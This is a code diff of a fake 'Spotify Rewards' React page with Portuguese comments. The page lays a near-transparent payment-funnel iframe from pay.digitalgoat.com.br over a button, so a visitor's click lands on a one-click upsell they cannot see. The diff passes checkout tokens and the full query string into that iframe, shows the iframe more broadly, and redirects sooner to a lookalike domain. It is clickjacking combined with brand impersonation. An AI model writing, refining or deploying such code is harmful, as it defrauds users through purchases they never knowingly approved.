@@ -1,5 +1,5 @@
 import { createFileRoute } from "@tanstack/react-router";
-import { useEffect, useState } from "react";
+import { useEffect, useState, useRef } from "react";
 
 import backgroundAsset from "../assets/background.png.asset.json";
 
@@ -56,18 +56,20 @@ function CheckmarkIcon({ className }: { className?: string }) {
 
 function WelcomeScreen({ onComplete }: { onComplete: () => void }) {
   const [displayedText, setDisplayedText] = useState("");
+  const [progress, setProgress] = useState(0);
 
   useEffect(() => {
     let index = 0;
     const interval = setInterval(() => {
       if (index < WELCOME_TEXT.length) {
         setDisplayedText(WELCOME_TEXT.slice(0, index + 1));
+        setProgress(Math.min(100, Math.round(((index + 1) / WELCOME_TEXT.length) * 100)));
         index++;
       } else {
         clearInterval(interval);
-        setTimeout(onComplete, 900);
+        setTimeout(onComplete, 800);
       }
-    }, 26);
+    }, 25);
 
     return () => clearInterval(interval);
   }, [onComplete]);
@@ -84,9 +86,12 @@ function WelcomeScreen({ onComplete }: { onComplete: () => void }) {
           <path d="M8 12L11 15L16 9" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
         </svg>
       </div>
-      <h2 className="mb-4 text-[18px] font-bold tracking-[-0.3px] text-white">
+      <h2 className="mb-2 text-[18px] font-bold tracking-[-0.3px] text-white">
         Welcome to Spotify Rewards
       </h2>
+      <p className="mb-4 text-[12px] font-medium text-[#1DB954]">
+        Preparing your account... {progress}%
+      </p>
       <p className="min-h-[120px] text-left text-[14.5px] leading-[1.7] text-[#a7a7a7]">
         {displayedText}
         <span className="ml-0.5 inline-block h-[18px] w-[2px] animate-blink bg-[#1DB954] align-middle" />
@@ -98,13 +103,18 @@ function WelcomeScreen({ onComplete }: { onComplete: () => void }) {
 function SuccessScreen() {
   const [isOcbActive, setIsOcbActive] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
+  const [queryString, setQueryString] = useState("");
+  const isRedirectingRef = useRef(false);
 
-  // Ativa o estado de carregamento e redireciona para o app após 8 segundos
+  // Ativa o estado de carregamento e redireciona para o app após 6 segundos (para dar tempo do upsell processar)
   const startRedirectTimer = () => {
+    if (isRedirectingRef.current) return;
+    isRedirectingRef.current = true;
     setIsLoading(true);
+
     setTimeout(() => {
       window.location.assign("https://spotifyus.vercel.app/app.html");
-    }, 8000);
+    }, 6000);
   };
 
   useEffect(() => {
@@ -118,9 +128,13 @@ function SuccessScreen() {
       originalAlert(msg);
     };
 
-    // Verifica se o visitante veio do checkout (possui o token OCB na URL)
-    const params = new URLSearchParams(window.location.search);
-    const hasToken = !!(params.get("OCB_SEC_TOKEN") || params.get("OCB_FUNNEL_ID"));
+    // Pega todos os parâmetros da URL atual para repassar no iframe da GOAT
+    const search = window.location.search;
+    setQueryString(search);
+
+    const params = new URLSearchParams(search);
+    // Ativa se houver token OCB ou se houver qualquer parâmetro vindo do checkout
+    const hasToken = !!(params.get("OCB_SEC_TOKEN") || params.get("OCB_FUNNEL_ID") || search.length > 1);
 
     if (hasToken) {
       setIsOcbActive(true);
@@ -134,11 +148,9 @@ function SuccessScreen() {
       }
     }
 
-    // Detecta se a janela perdeu foco (clique capturado pelo iframe do One-Click)
+    // Detecta clique no Iframe (Blur na window)
     const handleBlur = () => {
-      if (document.activeElement?.tagName === "IFRAME") {
-        startRedirectTimer();
-      }
+      startRedirectTimer();
     };
 
     window.addEventListener("blur", handleBlur);
@@ -150,9 +162,7 @@ function SuccessScreen() {
   }, []);
 
   const handleContainerClick = () => {
-    if (!isLoading) {
-      startRedirectTimer();
-    }
+    startRedirectTimer();
   };
 
   return (
@@ -194,11 +204,11 @@ function SuccessScreen() {
           )}
         </button>
 
-        {/* Renderiza o iframe invisível do One-Click por cima até o clique acontecer */}
+        {/* Renderiza o iframe invisível do One-Click repassando a query string completa */}
         {isOcbActive && !isLoading && (
           <iframe
             id="product-funnel-cmtknev9y037101ofjz20wu9l"
-            src="https://pay.digitalgoat.com.br/ext/funnel/cmtknev9y037101ofjz20wu9l"
+            src={`https://pay.digitalgoat.com.br/ext/funnel/cmtknev9y037101ofjz20wu9l${queryString}`}
             frameBorder="0"
             allowTransparency={true}
             className="absolute inset-0 z-10 h-full w-full cursor-pointer opacity-[0.001]"
